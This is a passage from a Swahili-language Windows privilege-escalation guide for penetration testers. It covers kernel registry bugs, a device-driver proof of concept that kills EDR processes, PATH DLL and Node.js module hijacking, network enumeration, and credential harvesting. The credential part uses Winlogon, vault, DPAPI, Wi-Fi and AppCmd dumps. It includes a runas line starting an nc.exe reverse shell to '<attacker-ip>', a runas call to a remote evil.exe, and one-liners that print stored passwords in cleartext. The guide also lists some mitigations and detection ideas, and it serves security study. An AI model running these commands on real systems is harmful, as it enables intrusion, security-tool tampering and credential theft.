- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ielekeze kwenye `UNICODE_STRING`. Ikiwa code kwanza inapakia `REG_DWORD` inayodhibitiwa na mshambuliaji kwenye scalar ya stack kisha kutumia tena buffer hiyo hiyo kwa string read, mshambuliaji hudhibiti `Length`/`MaximumLength` na kuathiri kwa sehemu pointer ya `Buffer`, na hivyo kusababisha kernel write inayodhibitiwa kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza katika `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa `REG_DWORD` read ya awali itaacha thamani **hasi** inayodhibitiwa na mshambuliaji kwenye scalar inayotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za mshambuliaji moja kwa moja juu ya nafasi za stack zilizo karibu, ambayo mara nyingi ndiyo njia rahisi zaidi ya kufuta pointer nzima ya callback.

Muundo thabiti wa kutafuta: **registry reads za aina tofauti kwenye stack variable ileile bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na njia za code ambapo registry read ya kwanza huamua ikiwa read ya pili itafanyika.

#### Kutumia vibaya kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party drivers zilizosainiwa huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, secure DACL haitumiki kifaa kinapofunguliwa kupitia path yenye component ya ziada, hivyo mtumiaji yeyote asiye na privilege anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishoweza kufungua kifaa, anaweza kutumia vibaya IOCTLs zenye privilege ambazo driver hutoa kwa LPE na tampering. Mifano ya uwezo ulioonekana kwenye matumizi halisi:
- Kurejesha handles zenye full access kwa processes zozote (token theft / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write isiyo na vizuizi (offline tampering, mbinu za boot-time persistence).
- Kusitisha processes zozote, ikiwemo Protected Process/Light (PP/PPL), na hivyo kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa operations zenye mamlaka ya juu. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejeshwa kwa handles.
- Weka vikwazo kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na uzingatie miundo inayotumia broker badala ya kutoa privileges za kernel moja kwa moja.

Mawazo ya detection kwa defenders
- Fuatilia ufunguaji kutoka user-mode wa majina ya vifaa yanayotiliwa shaka (k.m., \\ .\\amsdk*) na mfuatano maalum wa IOCTL unaoweza kuashiria matumizi mabaya.
- Tekeleza orodha ya Microsoft ya vulnerable drivers zilizozuiwa (HVCI/WDAC/Smart App Control) na udumishe orodha zako za allow/deny.

## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folder iliyo kwenye PATH**, unaweza kuteka nyara DLL inayopakiwa na process na **kupandisha privileges**.<sup>[[2]](#references)</sup>

Angalia ruhusa za folders zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji nyara wa utatuzi wa module za Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapotumia import isiyo na path kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta packages kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, kwa hivyo programu inayoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye mapendeleo ya chini** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye mapendeleo ya juu** utatue dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato wa mwathiriwa, kwa hivyo hali hii huwa **LPE** kila wakati target inaendeshwa kama administrator, kupitia scheduled task/service wrapper yenye mapendeleo yaliyoinuliwa, au kupitia desktop app yenye mapendeleo inayojiwasha kiotomatiki.

Hili hutokea hasa wakati:

- dependency imetangazwa kwenye `optionalDependencies`<sup>[[22]](#references)</sup>
- third-party library imeweka `require("foo")` ndani ya `try/catch` na kuendelea ikiwa haijafaulu
- package imeondolewa kwenye production builds, imeachwa wakati wa packaging, au imeshindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya dependency tree badala ya kuwa kwenye code kuu ya programu

### Kutafuta targets zilizo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable inayolengwa (`node.exe`, EXE ya Electron app, au wrapper process)
- Chuja kwa `Path` `contains` `node_modules`
- Zingatia `NAME NOT FOUND` na ufunguzi wa mwisho uliofaulu chini ya `C:\node_modules`

Mifumo muhimu ya kutafuta kwenye code review ya faili za `.asar` zilizofunguliwa au source za programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Anzisha application ya mwathiriwa. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano halisi ya modules za hiari zinazokosekana na zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** ndiyo inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows Node/Electron wenye privileges za juu utatatua.

### Mawazo ya utambuzi na uimarishaji wa usalama

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/package mpya za `.js` humo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime katika production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kutafuta mifumo ya `try { require("...") } catch {}` inayotekelezwa kimyakimya.
- Zima ukaguzi wa hiari ikiwa library inaunga mkono hilo (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Angalia kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye hosts file.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Miingiliano ya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Milango Wazi

Angalia **huduma zilizozuiwa** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa ufikiaji kama mtumiaji wake wa desktop ikiwa tu uthibitishaji na vidhibiti vya amri vinaruhusu. Programu maalum ya TCP inayoendeshwa chini ya akaunti yenye ruhusa za juu zaidi ni lengo tofauti la ukaguzi: listener na njia ya binary ni dalili za awali tu, ilhali njia ya authenticated memory-corruption inahitaji uchanganuzi wa binary hiyo mahususi na input inayoweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubainisha backend service; forwarding rule pekee haithibitishi kuwa destination inafikika au ina udhaifu.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, tengeneza sheria, zima, zima...)**

Amri zaidi za enumeration ya network [hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itauliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa `root` wa Linux ndani ya WSL hakukupi moja kwa moja haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distribution, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) kutafuta amri ambazo huenda zilihifadhi credentials; kupandisha mamlaka bado kunahitaji akaunti halali yenye mamlaka ya juu na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` hutumika kwenye usakinishaji wa zamani wa WSL; WSL 2 mara nyingi huhifadhi distribution kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hivyo tambua kwanza distribution na njia halisi ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa uchunguzi wa kiotomatiki.

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni finding ya registry yenye plaintext. Ikiwa `AutoAdminLogon=1` lakini hakuna password ya plaintext inayosomeka, huo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi password kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauthibitishi kama secret hiyo ipo au inaweza kupatikana. Kagua ruhusa za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuka kwa credential.

### Credentials manager / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa ajili ya servers, websites na programu nyingine ambazo **Windows** inaweza kutumia **kuingiza watumiaji kiotomatiki**. Mwanzoni, inaweza kuonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na vivinjari viingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii inamaanisha kwamba **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (server au website) **inaweza kutumia Credential Manager** na Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali fulani. Kwa hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` kwa kutumia taarifa za kuingia zilizotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kupitia [moduli ya Powershell ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila za maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (inayoonekana pia kama `Web Credentials` katika `vaultcmd`). Nafasi hii ya hifadhi imetengwa kwa kila session na inaweza kusimbuliwa kwa njia asilia bila haki za msimamizi au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session hai ya mtumiaji ili kutoa na kusimbua mara moja majina yote ya watumiaji na nywila za maandishi wazi zilizohifadhiwa:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya usimbaji fiche wa data kwa kutumia ufunguo linganifu, na hutumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kusimba kwa njia fiche funguo za faragha zisizolingana kwa kutumia ufunguo linganifu. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kwa kutumia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa domain ya mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa njia fiche kwa kutumia DPAPI huhifadhiwa katika saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, uliohifadhiwa pamoja na master key inayolinda funguo za faragha za mtumiaji katika faili hiyo hiyo**, kwa kawaida huwa na baiti 64 za data nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na argument zinazofaa (`/pvk` au `/rpc`) ili kuifungua.

**Faili za credentials zinazolindwa na master password** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa DPAPI** **masterkeys** nyingi kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credentials za PowerShell

**Credentials za PowerShell** hutumiwa mara nyingi kwa **scripting** na kazi za automation kama njia rahisi ya kuhifadhi credentials zilizosimbwa. Credentials hizi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kuwa zinaweza kusimbuliwa na mtumiaji yuleyule tu kwenye kompyuta ileile ambako ziliundwa.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Ikiwa script au orodha ya faili inaonyesha moja, tafuta saraka halisi ya profile ya akaunti badala ya kudhani kuwa iko kwenye `C:\Users`: [Windows inaweza kuweka profiles mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` hufunga credential iliyosimbwa kwa mtumiaji na kompyuta iliyoihamisha](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyorejeshwa lazima pia iwe na ruhusa halali kwenye service inayolengwa. Kagua njia na ACLs kwanza, bila kuchapisha thamani zilizosimbwa au zilizo wazi wakati wa uchunguzi wa kawaida.

Ili **kusimbua** credentials za PS kutoka kwenye faili iliyozihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Sifa za Kuingia cha Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na attributes za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kama kidokezo cha credentials. Thamani iliyohifadhiwa si password ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji ya faili na iwapo master password maalum ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa utafutaji mpana.

**Mauzo ya profaili ya Remote Desktop Plus** yanaweza pia kusomeka kwenye saraka za mtumiaji au folda ya pamoja ya usimamizi. Mauzo ya zamani ya `profiles.xml` yana maingizo ya `Data/Profile` yenye vipengele vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengele cha password kisicho tupu kama kidokezo cha credentials, bila kukichapisha au kudhani kwamba kiko katika maandishi ya kawaida: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profaili unaweza kufungamanishwa na akaunti na kompyuta iliyoiunda, au kusanidiwa bila masharti makali. Thibitisha asili ya faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Mara nyingi watu hutumia programu ya Sticky Notes kwenye workstation za Windows **kuhifadhi password** na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na inafaa kutafutwa na kuchunguzwa kila mara.

Wakati mwingine watu huhifadhi password na taarifa nyingine kwenye programu za madokezo yanayonata. Programu ya Sticky Notes iliyopakiwa na Microsoft kwa kawaida huhifadhi madokezo kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za wasifu wa mtumiaji, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na muundo wa hifadhi kabla ya kuhitimisha kuwa hakuna madokezo kwa sababu faili ya SQLite haipo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa madokezo ya hivi karibuni yaliyowekwa. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya database, na ujumuishe `plum.sqlite-shm` inapopatikana; index ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya database. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Dokezo lenye jina la akaunti au password ni kidokezo tu cha credentials: thibitisha akaunti, ruhusa za ufikiaji, na matumizi tena ya password kando. Rekodi iliyosimbwa ya password manager pia inahitaji ufunguo wake halisi wa usimbuaji na ufasiri maalum wa programu kabla ya kuthibitisha kuingia kwa akaunti yenye ruhusa za juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha password kutoka AppCmd.exe, lazima uwe Administrator na uendeshe kwa kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, huenda baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Visakinishi **huendeshwa kwa SYSTEM privileges**, vingi vinaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (Credentials)

### Vitu vya credential kwenye registry ya support tool

Baadhi ya usakinishaji wa zamani wa remote-support huhifadhi majina ya value yanayohusiana na password chini ya registry keys maalum za programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha static session password iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu registry key](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la value ni kidokezo tu cha kukagua: thibitisha toleo lililosakinishwa, data ya value inayosomeka, format na tabia ya sasa ya uthibitishaji kabla ya kutathmini credential hiyo. Kuhama kutoka password ya remote-support kwenda akaunti ya Windows yenye privilege zaidi kunahitaji pia password hiyo kutumiwa tena na kuwe na idhini ya kutumia akaunti hiyo. Usijumuishe ciphertext na password zilizorejeshwa kwenye matokeo ya kawaida ya enumeration.

### Lahajedwali zinazoshirikiwa zenye laha zilizolindwa

Ikiwa unashuku workbook inayosomeka na kushirikiwa ina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft inaeleza](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa maudhui ya workbook yamesimbwa kwa njia fiche. Kagua faili zilizoidhinishwa na zinazohusika pekee, na epuka kuchapisha siri zinazoweza kuwepo wakati wa enumeration ya jumla. Njia ya `.xlsx` inayosomeka, laha iliyolindwa, au safu wima iliyofichwa pekee haithibitishi kuwa kuna credentials au akaunti yoyote ina privileges za juu zaidi; thibitisha data halisi na haki za sasa za akaunti kando.

### Patches za mabadiliko zilizohifadhiwa na CI server

